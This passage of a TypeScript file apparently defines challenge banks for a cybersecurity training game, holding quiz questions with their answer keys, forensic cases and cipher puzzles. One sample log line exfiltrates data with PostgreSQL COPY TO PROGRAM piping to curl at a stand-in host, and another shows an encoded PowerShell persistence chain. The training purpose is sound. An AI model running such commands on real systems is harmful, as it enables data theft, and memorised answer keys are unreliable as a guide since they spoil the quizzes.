import type { GameEngineType } from './catalog-data';

export interface PlayerDescriptor {
  id: number;
  username: string;
  displayName: string;
  side: string;
}

export interface BattleQuestion {
  id: string;
  title: string;
  category: string;
  prompt: string;
  artifact: string;
  hint: string;
  points: number;
  acceptedAnswers: string[];
  explanation: string;
}

export interface InvestigationCase {
  caseCode: string;
  title: string;
  briefing: string;
  exhibits: Array<{
    id: string;
    label: string;
    source: string;
    content: string;
    clueCost: number;
    isClue?: boolean;
  }>;
  suspectOptions: string[];
  vectorOptions: string[];
  remediationOptions: string[];
  correctSuspect: string;
  correctVector: string;
  correctRemediation: string;
  resolutionSummary: string;
}

export interface StrategyWave {
  wave: number;
  threatName: string;
  threatType: 'ddos' | 'ransomware' | 'intrusion' | 'insider';
  severity: number;
  briefing: string;
  recommendedControl: 'firewall' | 'ids' | 'patching' | 'deception';
}

export interface PuzzleLock {
  lockNumber: number;
  title: string;
  cipherType: string;
  prompt: string;
  artifact: string;
  hint: string;
  acceptedAnswers: string[];
  points: number;
}

export interface SocialTask {
  id: string;
  title: string;
  prompt: string;
  options: string[];
  correctIndex: number;
}

// ============================================================================
// CURATED SERVER-ONLY CHALLENGE BANKS (NEVER SENT RAW TO CLIENTS)
// ============================================================================

const BATTLE_BANKS: Record<string, BattleQuestion[]> = {
  'cyber-ctf-battle': [
    {
      id: 'ctf-1',
      title: 'Exposed JWT Header',
      category: 'Web Security',
      prompt: 'Decode the Base64URL string below to retrieve the hidden KALI3977 flag.',
      artifact: 'S0FMSTM5Nzd7and0X2FsZ19ub25lX2J5cGFzc30=',
      hint: 'Use Base64 decoding on the exact artifact string.',
      points: 150,
      acceptedAnswers: ['KALI3977{jwt_alg_none_bypass}'],
      explanation: 'Base64 decodes directly to KALI3977{jwt_alg_none_bypass}. Never trust client-supplied alg:none headers.',
    },
    {
      id: 'ctf-2',
      title: 'Hex Beacon Exfil',
      category: 'Network Forensics',
      prompt: 'Convert this ASCII hex payload captured in an ICMP echo packet into the flag.',
      artifact: '4b414c49333937377b69636d705f74756e6e656c5f6361756768747d',
      hint: 'Each pair of hex digits maps to one ASCII byte (4b = K, 41 = A).',
      points: 180,
      acceptedAnswers: ['KALI3977{icmp_tunnel_caught}'],
      explanation: 'Hex bytes decode to KALI3977{icmp_tunnel_caught}. Monitor unusual ICMP payload lengths.',
    },
    {
      id: 'ctf-3',
      title: 'SUID Audit Command',
      category: 'Linux Privilege Esc',
      prompt: 'What exact find command locates all SUID binaries owned by root starting from / ?',
      artifact: 'Required flags: -perm -4000 (redirect stderr to /dev/null optional)',
      hint: 'find / -perm -4000',
      points: 170,
      acceptedAnswers: [
        'find / -perm -4000',
        'find / -perm -4000 2>/dev/null',
        'find / -user root -perm -4000',
        'find / -user root -perm -4000 2>/dev/null',
      ],
      explanation: 'Permission bit 4000 corresponds to SUID; auditing unexpected SUID binaries prevents local privilege escalation.',
    },
    {
      id: 'ctf-4',
      title: 'Caesar Log Obfuscation',
      category: 'Cryptography',
      prompt: 'Shift each letter backward by 3 (ROT-3 decode) inside the braces to recover the flag.',
      artifact: 'KALI3977{fubswr_vkliw_3}',
      hint: 'f -> c, u -> r, b -> y...',
      points: 160,
      acceptedAnswers: ['KALI3977{crypto_shift_3}'],
      explanation: 'Shifting each letter back by 3 reveals crypto_shift_3.',
    },
    {
      id: 'ctf-5',
      title: 'SQL Injection Root Cause',
      category: 'Secure Coding',
      prompt: 'Which defense eliminates SQL injection in PostgreSQL queries: parameterized_queries or input_length_only?',
      artifact: 'db.query("SELECT * FROM users WHERE email = $1", [email])',
      hint: 'Binding parameters separates code from user data.',
      points: 140,
      acceptedAnswers: ['parameterized_queries', 'parameterized queries', 'prepared statements'],
      explanation: 'Parameterized queries / prepared statements ensure user input is never interpreted as SQL syntax.',
    },
  ],
  'hack-or-defend': [
    {
      id: 'hod-1',
      title: 'Cross-Tenant Invoice Read',
      category: 'BOLA / IDOR',
      prompt: 'An API reads /api/invoices/:id without checking req.user.id. Name the vulnerability class (e.g. IDOR or BOLA).',
      artifact: 'GET /api/invoices/9942 -> returns another customer invoice PDF',
      hint: 'Broken Object Level Authorization or Insecure Direct Object Reference.',
      points: 150,
      acceptedAnswers: ['bola', 'idor', 'broken object level authorization', 'insecure direct object reference'],
      explanation: 'Always enforce server-side object ownership checks on every resource query.',
    },
    {
      id: 'hod-2',
      title: 'CORS Wildcard + Credentials',
      category: 'Browser Security',
      prompt: 'Why is Access-Control-Allow-Origin: * combined with Allow-Credentials: true insecure if reflected dynamically?',
      artifact: 'res.setHeader("Access-Control-Allow-Origin", req.headers.origin); res.setHeader("Access-Control-Allow-Credentials", "true");',
      hint: 'Specify the flaw name: origin_reflection or arbitrary_origin_reflection',
      points: 160,
      acceptedAnswers: ['origin_reflection', 'arbitrary origin reflection', 'cors misconfiguration', 'cors'],
      explanation: 'Reflecting unvalidated Origin headers with credentials lets any malicious site read authenticated responses.',
    },
    {
      id: 'hod-3',
      title: 'Password Storage Hardening',
      category: 'Authentication',
      prompt: 'Which algorithm is strongest for password hashing here: md5, sha1, or argon2id?',
      artifact: 'Legacy DB currently stores SHA-1(password) without salt.',
      hint: 'Memory-hard modern KDF recommended by OWASP.',
      points: 140,
      acceptedAnswers: ['argon2id', 'argon2'],
      explanation: 'Argon2id resists GPU and ASIC brute-forcing via configurable memory hardness.',
    },
    {
      id: 'hod-4',
      title: 'Command Injection Sink',
      category: 'OS Injection',
      prompt: 'Which Node.js call safely avoids shell interpolation: execFile or exec?',
      artifact: 'child_process.???("ping", ["-c", "1", host])',
      hint: 'Passes argument array directly without spawning /bin/sh.',
      points: 150,
      acceptedAnswers: ['execfile', 'spawn'],
      explanation: 'execFile / spawn without shell:true bypasses shell metacharacter parsing.',
    },
  ],
  'terminal-rush': [
    {
      id: 'tr-1',
      title: 'Lock Down SSH Private Key',
      category: 'Permissions',
      prompt: 'Run the exact chmod command to restrict ~/.ssh/id_ed25519 to owner read/write only.',
      artifact: 'Target file: ~/.ssh/id_ed25519',
      hint: '600 grants rw-------',
      points: 140,
      acceptedAnswers: ['chmod 600 ~/.ssh/id_ed25519', 'chmod 0600 ~/.ssh/id_ed25519'],
      explanation: 'SSH refuses private keys readable by group or world.',
    },
    {
      id: 'tr-2',
      title: 'List Active Listening Sockets',
      category: 'Networking CLI',
      prompt: 'Which modern Linux command prints all listening TCP & UDP sockets with numeric ports and processes?',
      artifact: 'Flag combo using ss: -tulpn',
      hint: 'ss -tulpn',
      points: 150,
      acceptedAnswers: ['ss -tulpn', 'ss -tulnp', 'sudo ss -tulpn', 'netstat -tulpn'],
      explanation: 'ss -tulpn quickly surfaces unauthorized reverse shells or rogue daemons.',
    },
    {
      id: 'tr-3',
      title: 'Terminate Malicious Process',
      category: 'Incident Response',
      prompt: 'Send SIGKILL (signal 9) immediately to PID 4812.',
      artifact: 'Rogue miner process running at PID 4812',
      hint: 'kill -9 4812',
      points: 130,
      acceptedAnswers: ['kill -9 4812', 'kill -s kill 4812', 'kill -sigkill 4812'],
      explanation: 'SIGKILL forces immediate kernel termination of unresponsive rogue processes.',
    },
    {
      id: 'tr-4',
      title: 'Inspect Last 50 Auth Failures',
      category: 'Log Triage',
      prompt: 'Show the last 50 lines of /var/log/auth.log.',
      artifact: 'Target file: /var/log/auth.log',
      hint: 'tail -n 50 /var/log/auth.log',
      points: 140,
      acceptedAnswers: ['tail -n 50 /var/log/auth.log', 'tail -50 /var/log/auth.log'],
      explanation: 'tail -n inspects the newest authentication entries rapidly.',
    },
  ],
  'password-cracking-challenge': [
    {
      id: 'pw-1',
      title: 'Identify Hash Family',
      category: 'Hash Analysis',
      prompt: 'A leaked digest is 64 lowercase hex characters: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855. Which algorithm is this?',
      artifact: 'Length: 256 bits / 64 hex chars',
      hint: 'Standard 256-bit SHA-2 digest.',
      points: 140,
      acceptedAnswers: ['sha256', 'sha-256'],
      explanation: 'SHA-256 outputs a 256-bit (64-hex-character) digest.',
    },
    {
      id: 'pw-2',
      title: 'Audit Weak Unsalted Digest',
      category: 'Hash Recovery',
      prompt: 'The SHA-256 digest of a single uppercase word is 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 (well-known benchmark hash). What is the plaintext?',
      artifact: 'NIST/rockyou top-1 default test password',
      hint: '8 lowercase letters, literally the word itself.',
      points: 160,
      acceptedAnswers: ['password'],
      explanation: 'Common dictionary passwords are cracked instantly via precomputed rainbow tables.',
    },
    {
      id: 'pw-3',
      title: 'Bcrypt Prefix Check',
      category: 'Key Derivation',
      prompt: 'What cost factor is configured in the bcrypt hash $2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW ?',
      artifact: '$2b$12$...',
      hint: 'Number immediately following $2b$.',
      points: 150,
      acceptedAnswers: ['12'],
      explanation: 'Cost 12 performs 2^12 key schedule rounds.',
    },
  ],
  'network-defense': [
    {
      id: 'nd-1',
      title: 'Block C2 Subnetwork',
      category: 'Firewall Policy',
      prompt: 'Write the ufw deny rule to block all incoming traffic from IP 203.0.113.45.',
      artifact: 'Repeated SSH brute-force + beacon attempts from 203.0.113.45',
      hint: 'ufw deny from 203.0.113.45',
      points: 160,
      acceptedAnswers: ['ufw deny from 203.0.113.45', 'sudo ufw deny from 203.0.113.45', 'iptables -a input -s 203.0.113.45 -j drop'],
      explanation: 'Blocking offending source IPs at the host/perimeter firewall halts automated scanners.',
    },
    {
      id: 'nd-2',
      title: 'Detect DNS Exfiltration',
      category: 'Traffic Analysis',
      prompt: 'A host sends 4,200 DNS TXT queries per minute with 60-char hex subdomains to exfil.bad-example.net. What technique is this?',
      artifact: '198.51.100.14 -> UDP/53 TXT 4f6b2e...exfil.bad-example.net',
      hint: 'Encoding C2/exfil data inside DNS queries.',
      points: 170,
      acceptedAnswers: ['dns tunneling', 'dns_tunneling', 'dns exfiltration'],
      explanation: 'DNS tunneling hides covert channels inside allowed port 53 lookups.',
    },
    {
      id: 'nd-3',
      title: 'Restrict Internal Postgres Port',
      category: 'Zero Trust',
      prompt: 'Which default TCP port does PostgreSQL listen on that must NEVER be exposed to 0.0.0.0/0?',
      artifact: 'Internal DB listening port',
      hint: 'Four digits starting with 54.',
      points: 130,
      acceptedAnswers: ['5432'],
      explanation: 'PostgreSQL defaults to TCP/5432 and should only bind to private VPC/Unix sockets.',
    },
  ],
  'linux-command-race': [
    {
      id: 'lcr-1',
      title: 'Recursive Grep',
      category: 'Search',
      prompt: 'Search recursively for "API_KEY" inside ./src showing line numbers.',
      artifact: 'Flags needed: -r and -n',
      hint: 'grep -rn "API_KEY" ./src (quotes optional)',
      points: 140,
      acceptedAnswers: ['grep -rn api_key ./src', 'grep -rn "api_key" ./src', 'grep -rn api_key src', 'grep -rn "api_key" src'],
      explanation: 'grep -rn recursively inspects directories with line numbers.',
    },
    {
      id: 'lcr-2',
      title: 'Check Disk Free Space',
      category: 'System Health',
      prompt: 'Display mounted filesystem disk usage in human-readable units.',
      artifact: 'Short 2-letter utility + flag',
      hint: 'df -h',
      points: 120,
      acceptedAnswers: ['df -h'],
      explanation: 'df -h prints human-readable GiB/MiB partition usage.',
    },
    {
      id: 'lcr-3',
      title: 'Verify SHA-256 Checksum',
      category: 'Integrity',
      prompt: 'Generate the SHA-256 hash of backup.tar.gz on Debian/Ubuntu.',
      artifact: 'Target: backup.tar.gz',
      hint: 'sha256sum backup.tar.gz',
      points: 130,
      acceptedAnswers: ['sha256sum backup.tar.gz'],
      explanation: 'sha256sum verifies binary and archive integrity.',
    },
  ],
  'regex-challenge': [
    {
      id: 'rx-1',
      title: 'Match CVE Identifier',
      category: 'Pattern Matching',
      prompt: 'Write a regex that matches CVE-2026-12345 (4-digit year, 4+ digit sequence).',
      artifact: 'Positive: CVE-2026-12345 | Negative: CVE-26-12',
      hint: '^CVE-\\d{4}-\\d{4,}$',
      points: 160,
      acceptedAnswers: ['^cve-\\d{4}-\\d{4,}$', 'cve-\\d{4}-\\d{4,}', 'cve-[0-9]{4}-[0-9]{4,}'],
      explanation: 'Explicit bounded quantifiers prevent ReDoS and false positives.',
    },
    {
      id: 'rx-2',
      title: 'Hex Digest Pattern',
      category: 'Tokens',
      prompt: 'Write a regex matching exactly 32 lowercase hex characters (MD5).',
      artifact: 'Char class [0-9a-f] with exact length quantifier',
      hint: '^[0-9a-f]{32}$',
      points: 150,
      acceptedAnswers: ['^[0-9a-f]{32}$', '[0-9a-f]{32}', '^[a-f0-9]{32}$'],
      explanation: 'Anchored [0-9a-f]{32} matches exact 128-bit hex digests.',
    },
  ],
  'code-debugging': [
    {
      id: 'cd-1',
      title: 'Fix Prototype Pollution',
      category: 'TypeScript / JS',
      prompt: 'Which object keys must be rejected during recursive JSON merge to stop prototype pollution? Name the primary one.',
      artifact: 'if (key === "???" || key === "constructor") continue;',
      hint: 'Starts and ends with double underscores.',
      points: 160,
      acceptedAnswers: ['__proto__'],
      explanation: 'Filtering __proto__, constructor, and prototype prevents Object.prototype tampering.',
    },
    {
      id: 'cd-2',
      title: 'Timing Attack Prevention',
      category: 'Node.js Crypto',
      prompt: 'Which crypto module function performs constant-time buffer comparison in Node.js?',
      artifact: 'crypto.???(bufA, bufB)',
      hint: 'timingSafeEqual',
      points: 170,
      acceptedAnswers: ['timingsafeequal', 'crypto.timingsafeequal'],
      explanation: 'crypto.timingSafeEqual prevents byte-by-byte timing side-channel leaks.',
    },
  ],
  'spot-the-vulnerability': [
    {
      id: 'stv-1',
      title: 'Overly Permissive IAM Policy',
      category: 'Cloud Security',
      prompt: 'Spot the dangerous wildcard field value in: { "Effect": "Allow", "Action": "*", "Resource": "*" }',
      artifact: 'AWS/GCP IAM Statement allows Action:* on Resource:*',
      hint: 'Principle name violated: least_privilege',
      points: 150,
      acceptedAnswers: ['least_privilege', 'least privilege', 'wildcard permissions', 'excessive permissions', 'admin wildcard'],
      explanation: 'Granting Action:* on Resource:* violates Least Privilege and gives full takeover.',
    },
    {
      id: 'stv-2',
      title: 'Open Redirect Parameter',
      category: 'Web Flaw',
      prompt: 'GET /login?next=https://evil.example redirects straight to req.query.next. Name this vulnerability.',
      artifact: 'res.redirect(String(req.query.next))',
      hint: 'Two words: open redirect',
      points: 140,
      acceptedAnswers: ['open redirect', 'open_redirect', 'unvalidated redirect'],
      explanation: 'Always validate redirect targets against an allowlist of relative paths or owned origins.',
    },
  ],
  'networking-speed-test': [
    {
      id: 'nst-1',
      title: 'Usable Hosts in /26',
      category: 'Subnetting',
      prompt: 'How many usable host IPv4 addresses exist in a /26 subnet?',
      artifact: '32 - 26 = 6 host bits -> (2^6) - 2',
      hint: '64 minus network and broadcast addresses.',
      points: 140,
      acceptedAnswers: ['62'],
      explanation: '2^6 - 2 = 62 usable host addresses.',
    },
    {
      id: 'nst-2',
      title: 'HTTPS Port',
      category: 'Ports',
      prompt: 'Which standard TCP port serves TLS-encrypted HTTPS traffic?',
      artifact: 'Default TLS web port',
      hint: 'Three digits starting with 4.',
      points: 110,
      acceptedAnswers: ['443'],
      explanation: 'Port 443 is standard HTTPS.',
    },
    {
      id: 'nst-3',
      title: 'SSH Default Port',
      category: 'Ports',
      prompt: 'Which TCP port is assigned to OpenSSH by IANA?',
      artifact: 'Remote secure shell service',
      hint: 'Below 25.',
      points: 110,
      acceptedAnswers: ['22'],
      explanation: 'TCP/22 is the IANA-assigned SSH port.',
    },
  ],
};

const INVESTIGATION_CASES: Record<string, InvestigationCase> = {
  'cyber-detective': {
    caseCode: 'CASE-K3977-01',
    title: 'Operation Midnight Ledger — Vault Exfiltration',
    briefing:
      'At 02:14 UTC, 180 MB of encrypted R&D schematics left the Helsinki Research Gateway. Four engineers had VPN credentials active that window. Inspect the forensic exhibits and expose the true insider, attack vector, and containment action.',
    exhibits: [
      {
        id: 'ex-auth',
        label: 'SSH & VPN Auth Logs',
        source: '/var/log/vpn-auth.log',
        content:
          '02:01:12 UTC user=m.keller ip=84.21.19.8 status=MFA_OK\n02:09:44 UTC user=a.sharma ip=103.44.12.90 status=MFA_BYPASS_LEGACY_TOKEN\n02:11:03 UTC user=r.lin ip=192.0.2.40 status=DENIED\n02:12:18 UTC user=a.sharma sudo="/usr/bin/tar -czf /tmp/.cache.tgz /srv/vault"',
        clueCost: 0,
      },
      {
        id: 'ex-dns',
        label: 'DNS & Proxy Egress Telemetry',
        source: 'suricata-egress.json',
        content:
          '02:14:02 UTC src=10.20.4.18 dst=198.51.100.77 proto=HTTPS bytes=188743680 host=cdn-mirror-sync.invalid\n02:14:04 UTC src=10.20.4.18 cmd_parent="sshd: a.sharma@pts/2"',
        clueCost: 0,
      },
      {
        id: 'ex-badge',
        label: 'Physical Badge & Alibi Verification',
        source: 'facility-badge-db',
        content:
          'CLUE UNLOCKED: m.keller badge swiped on-site in Munich with hardware YubiKey. a.sharma physical badge was unused for 9 days while a legacy unrotated API service token belonging to a.sharma remained active in CI.',
        clueCost: 20,
        isClue: true,
      },
    ],
    suspectOptions: ['a.sharma (Legacy Token)', 'm.keller (On-site Engineer)', 'r.lin (Denied Login)'],
    vectorOptions: ['Unrotated Legacy Service Token + Sudo Tar Exfil', 'Zero-Day Kernel Exploit', 'Physical USB Drop'],
    remediationOptions: [
      'Revoke legacy token, rotate vault secrets & enforce mandatory MFA',
      'Reboot DNS resolver only',
      'Disable external ICMP pings',
    ],
    correctSuspect: 'a.sharma (Legacy Token)',
    correctVector: 'Unrotated Legacy Service Token + Sudo Tar Exfil',
    correctRemediation: 'Revoke legacy token, rotate vault secrets & enforce mandatory MFA',
    resolutionSummary:
      'Auth logs confirmed a.sharma’s unrotated legacy token bypassed MFA, archived /srv/vault via sudo tar, and exfiltrated 180 MB over HTTPS.',
  },
  'digital-evidence-hunt': {
    caseCode: 'CASE-K3977-02',
    title: 'Tampered Chain-of-Custody Archive',
    briefing:
      'A forensic acquisition archive failed SHA-256 integrity checks before court submission. Identify which exhibit was altered and how.',
    exhibits: [
      {
        id: 'deh-1',
        label: 'Hash Manifest Diff',
        source: 'manifest.sha256',
        content: 'disk_part1.img: MATCH\nevidence_chat.sqlite: MISMATCH (mtime modified +14 minutes after acquisition)',
        clueCost: 0,
      },
      {
        id: 'deh-2',
        label: 'Write-Blocker Hardware Log',
        source: 'tableau-log.txt',
        content: 'CLUE: USB mount performed on workstation WS-04 without hardware write-blocker by contractor j.vance.',
        clueCost: 15,
        isClue: true,
      },
    ],
    suspectOptions: ['j.vance (Workstation WS-04)', 'Automated Cron Backup', 'Kernel Crash Dump'],
    vectorOptions: ['Unblocked Read/Write Mount Altering SQLite Journal', 'BGP Route Hijack', 'Ransomware Encryption'],
    remediationOptions: [
      'Re-acquire from golden master with hardware write-blocker & verify SHA-256',
      'Ignore timestamp mismatch',
      'Format acquisition drive',
    ],
    correctSuspect: 'j.vance (Workstation WS-04)',
    correctVector: 'Unblocked Read/Write Mount Altering SQLite Journal',
    correctRemediation: 'Re-acquire from golden master with hardware write-blocker & verify SHA-256',
    resolutionSummary: 'Mounting evidence_chat.sqlite without a write-blocker mutated SQLite metadata and broke chain-of-custody.',
  },
  'who-is-the-hacker': {
    caseCode: 'CASE-K3977-03',
    title: 'Phantom Git Commit & Key Leak',
    briefing:
      'Production database credentials appeared in an unauthorized public fork. Pinpoint the guilty account from commit metadata and VPN telemetry.',
    exhibits: [
      {
        id: 'wih-1',
        label: 'Git Reflog & PGP Status',
        source: 'git-audit.log',
        content: 'commit 9a81f2: author=dev-bot (UNSIGNED) pushed from IP 203.0.113.99 at 03:42 UTC',
        clueCost: 0,
      },
      {
        id: 'wih-2',
        label: 'Cloud IAM AssumeRole',
        source: 'cloudtrail.json',
        content: 'CLUE: 03:40 UTC user=k.morris assumed dev-bot deploy key from 203.0.113.99.',
        clueCost: 15,
        isClue: true,
      },
    ],
    suspectOptions: ['k.morris (Assumed dev-bot)', 'ci-runner-eu', 'd.patel (Read-only auditor)'],
    vectorOptions: ['IAM Role Assumption + Unsigned Force Push', 'SQL Injection', 'ARP Spoofing'],
    remediationOptions: [
      'Revoke k.morris IAM sessions, rotate DB secrets & require signed commits',
      'Delete entire Git repository',
      'Allow unsigned force pushes',
    ],
    correctSuspect: 'k.morris (Assumed dev-bot)',
    correctVector: 'IAM Role Assumption + Unsigned Force Push',
    correctRemediation: 'Revoke k.morris IAM sessions, rotate DB secrets & require signed commits',
    resolutionSummary: 'CloudTrail linked IP 203.0.113.99 directly to k.morris assuming the dev-bot role.',
  },
  'trace-the-attack': {
    caseCode: 'CASE-K3977-04',
    title: 'Kill-Chain APT Reconstruction',
    briefing: 'Trace how an attacker pivoted from a macro email into domain persistence within 19 minutes.',
    exhibits: [
      {
        id: 'tta-1',
        label: 'EDR Process Tree',
        source: 'edr-tree.txt',
        content: 'WINWORD.EXE -> powershell.exe -EncodedCommand ... -> schtasks /create /tn "SysHealth" /sc ONLOGON',
        clueCost: 0,
      },
      {
        id: 'tta-2',
        label: 'Firewall Beacon Alert',
        source: 'fw-alert.log',
        content: 'CLUE: Persistence task "SysHealth" beacons every 60s to 192.0.2.210:8443.',
        clueCost: 15,
        isClue: true,
      },
    ],
    suspectOptions: ['External Phishing Operator (192.0.2.210)', 'Database Migration Script', 'Local Printer Driver'],
    vectorOptions: ['Spearphishing Macro -> Encoded PowerShell -> Scheduled Task Persistence', 'Heartbleed OpenSSL', 'Port 21 Anonymous FTP'],
    remediationOptions: [
      'Isolate host, delete SysHealth scheduled task & sinkhole 192.0.2.210',
      'Clear browser cookies only',
      'Enable guest Wi-Fi',
    ],
    correctSuspect: 'External Phishing Operator (192.0.2.210)',
    correctVector: 'Spearphishing Macro -> Encoded PowerShell -> Scheduled Task Persistence',
    correctRemediation: 'Isolate host, delete SysHealth scheduled task & sinkhole 192.0.2.210',
    resolutionSummary: 'WINWORD spawned encoded PowerShell and registered SysHealth scheduled task persistence.',
  },
  'missing-data-case': {
    caseCode: 'CASE-K3977-05',
    title: 'Vanished Research Snapshots',
    briefing: '40,000 anonymized telemetry rows disappeared from PostgreSQL and backup buckets vanished.',
    exhibits: [
      {
        id: 'mdc-1',
        label: 'PostgreSQL Query Audit',
        source: 'pgaudit.log',
        content: '01:05 UTC role=analytics_ro -> FAILED\n01:08 UTC role=migrator_admin -> COPY research_records TO PROGRAM "curl -T - https://drop.invalid"',
        clueCost: 0,
      },
      {
        id: 'mdc-2',
        label: 'Bucket Lifecycle Policy',
        source: 'storage-audit.json',
        content: 'CLUE: migrator_admin credential leaked in public .env.bak file on staging nginx.',
        clueCost: 15,
        isClue: true,
      },
    ],
    suspectOptions: ['External Attacker via Leaked .env.bak', 'analytics_ro (Read-Only)', 'PgBouncer Pooler'],
    vectorOptions: ['Exposed .env.bak Backup -> PostgreSQL COPY TO PROGRAM Exfil', 'XSS Cookie Theft', 'BGP Hijack'],
    remediationOptions: [
      'Remove .env.bak, rotate migrator_admin & restrict superuser COPY TO PROGRAM',
      'Increase connection pool size',
      'Disable TLS',
    ],
    correctSuspect: 'External Attacker via Leaked .env.bak',
    correctVector: 'Exposed .env.bak Backup -> PostgreSQL COPY TO PROGRAM Exfil',
    correctRemediation: 'Remove .env.bak, rotate migrator_admin & restrict superuser COPY TO PROGRAM',
    resolutionSummary: 'A publicly served .env.bak leaked migrator_admin credentials used to execute COPY TO PROGRAM.',
  },
};

const STRATEGY_WAVES: StrategyWave[] = [
  {
    wave: 1,
    threatName: 'Volumetric SYN Flood',
    threatType: 'ddos',
    severity: 25,
    briefing: 'Botnet swarm targeting perimeter edge ports 80/443 with 40 Gbps SYN bursts.',
    recommendedControl: 'firewall',
  },
  {
    wave: 2,
    threatName: 'Credential Stuffing & Lateral Probe',
    threatType: 'intrusion',
    severity: 32,
    briefing: 'Automated probing testing weak SSH keys and internal east-west lateral paths.',
    recommendedControl: 'ids',
  },
  {
    wave: 3,
    threatName: 'Zero-Day Serialization Worm',
    threatType: 'ransomware',
    severity: 40,
    briefing: 'Fast-spreading payload attempting to encrypt worker nodes via unpatched middleware.',
    recommendedControl: 'patching',
  },
  {
    wave: 4,
    threatName: 'APT Multi-Stage Decoy Intrusion',
    threatType: 'insider',
    severity: 45,
    briefing: 'Targeted adversary attempting stealth privilege escalation inside core vaults.',
    recommendedControl: 'deception',
  },
];

const PUZZLE_BANKS: Record<string, PuzzleLock[]> = {
  'cyber-escape-room': [
    {
      lockNumber: 1,
      title: 'Chamber 1 — Base64 Airlock',
      cipherType: 'Base64',
      prompt: 'Decode the door access keyword to disengage the first magnetic lock.',
      artifact: 'U0hJRUxEMzk3Nw==',
      hint: 'Standard Base64 ASCII decode.',
      acceptedAnswers: ['SHIELD3977'],
      points: 150,
    },
    {
      lockNumber: 2,
      title: 'Chamber 2 — Hexadecimal Telemetry Gate',
      cipherType: 'Hex',
      prompt: 'Convert the hex string into ASCII to override the proxy relay.',
      artifact: '455343415045',
      hint: '6 ASCII uppercase letters.',
      acceptedAnswers: ['ESCAPE'],
      points: 160,
    },
    {
      lockNumber: 3,
      title: 'Chamber 3 — Bitwise XOR Gate',
      cipherType: 'Bitwise Logic',
      prompt: 'Compute (13 XOR 7) in decimal to synchronize the airgap clock.',
      artifact: '13 = 1101 binary, 7 = 0111 binary',
      hint: '1101 ^ 0111 = 1010 binary.',
      acceptedAnswers: ['10'],
      points: 170,
    },
    {
      lockNumber: 4,
      title: 'Chamber 4 — Final Vault Override',
      cipherType: 'ROT13',
      prompt: 'Apply ROT13 to "XNYV" and append "-OK" to unlock the exit.',
      artifact: 'ROT13("XNYV") + "-OK"',
      hint: 'X->K, N->A, Y->L, V->I',
      acceptedAnswers: ['KALI-OK'],
      points: 200,
    },
  ],
  'decode-the-message': [
    {
      lockNumber: 1,
      title: 'Signal 1 — ROT13 Beacon',
      cipherType: 'ROT13',
      prompt: 'Decode the intercepted field word.',
      artifact: 'PVCURE',
      hint: 'Shift by 13 letters.',
      acceptedAnswers: ['CIPHER'],
      points: 140,
    },
    {
      lockNumber: 2,
      title: 'Signal 2 — Reverse Hex',
      cipherType: 'Hex',
      prompt: 'Decode hex 4e4f4445.',
      artifact: '4e4f4445',
      hint: '4-letter word.',
      acceptedAnswers: ['NODE'],
      points: 150,
    },
    {
      lockNumber: 3,
      title: 'Signal 3 — Binary ASCII',
      cipherType: 'Binary',
      prompt: 'Convert binary 01001111 01001011 to two ASCII letters.',
      artifact: '01001111 01001011',
      hint: '79 and 75 in decimal ASCII.',
      acceptedAnswers: ['OK'],
      points: 160,
    },
    {
      lockNumber: 4,
      title: 'Signal 4 — Base64 Extraction',
      cipherType: 'Base64',
      prompt: 'Decode VEVMRU1FVFJZ to complete the message.',
      artifact: 'VEVMRU1FVFJZ',
      hint: 'Starts with TELE...',
      acceptedAnswers: ['TELEMETRY'],
      points: 180,
    },
  ],
  'encrypted-vault': [
    {
      lockNumber: 1,
      title: 'Barrier 1 — Modular Remainder',
      cipherType: 'Modular Arithmetic',
      prompt: 'Compute (7 * 11) mod 13.',
      artifact: '77 mod 13',
      hint: '13 * 5 = 65.',
      acceptedAnswers: ['12'],
      points: 160,
    },
    {
      lockNumber: 2,
      title: 'Barrier 2 — RSA Totient',
      cipherType: 'RSA Math',
      prompt: 'For primes p = 5 and q = 11, compute Euler totient phi(n) = (p-1)(q-1).',
      artifact: 'p = 5, q = 11',
      hint: '4 * 10',
      acceptedAnswers: ['40'],
      points: 170,
    },
    {
      lockNumber: 3,
      title: 'Barrier 3 — AES Block Size',
      cipherType: 'Block Ciphers',
      prompt: 'How many bits is a standard AES block size (128, 192, or 256)?',
      artifact: 'Applies to AES-128, AES-192, and AES-256 equally.',
      hint: '16 bytes = ? bits',
      acceptedAnswers: ['128'],
      points: 160,
    },
    {
      lockNumber: 4,
      title: 'Barrier 4 — Final PIN',
      cipherType: 'Checksum',
      prompt: 'Enter the 4-digit PIN where digits sum to 14 and match 39?? with last two digits equal.',
      artifact: '3 + 9 + d + d = 14',
      hint: '12 + 2*d = 14 -> d = 1',
      acceptedAnswers: ['3911'],
      points: 200,
    },
  ],
  'logic-labyrinth': [
    {
      lockNumber: 1,
      title: 'Gate 1 — Bitwise AND',
      cipherType: 'Bitmask',
      prompt: 'Compute (192 AND 240) in decimal (subnet mask operation).',
      artifact: '11000000 & 11110000',
      hint: 'Top 4 bits preserved.',
      acceptedAnswers: ['192'],
      points: 140,
    },
    {
      lockNumber: 2,
      title: 'Gate 2 — Bitwise OR',
      cipherType: 'Bitmask',
      prompt: 'Compute (8 OR 4) in decimal.',
      artifact: '1000 | 0100',
      hint: '8 + 4',
      acceptedAnswers: ['12'],
      points: 140,
    },
    {
      lockNumber: 3,
      title: 'Gate 3 — De Morgan Equivalence',
      cipherType: 'Boolean Algebra',
      prompt: 'NOT (A AND B) is logically equivalent to "(NOT A) ??? (NOT B)". Enter the operator (AND/OR).',
      artifact: '!(A && B) === (!A ??? !B)',
      hint: 'De Morgan swaps AND and OR.',
      acceptedAnswers: ['OR'],
      points: 160,
    },
    {
      lockNumber: 4,
      title: 'Gate 4 — Bit Shift',
      cipherType: 'Bitwise Shift',
      prompt: 'Evaluate (1 << 5) in decimal.',
      artifact: '2 to the power of 5',
      hint: '32',
      acceptedAnswers: ['32'],
      points: 170,
    },
  ],
  'mission-impossible': [
    {
      lockNumber: 1,
      title: 'Override 1 — Port Knock Sequence',
      cipherType: 'Network Sequence',
      prompt: 'Enter the sum of knock ports 7000 + 8000 + 9000.',
      artifact: 'Knock ports: 7000, 8000, 9000',
      hint: '24000',
      acceptedAnswers: ['24000'],
      points: 150,
    },
    {
      lockNumber: 2,
      title: 'Override 2 — JWT Segment Count',
      cipherType: 'Protocol',
      prompt: 'How many dot-separated Base64URL segments are in a standard JWS/JWT?',
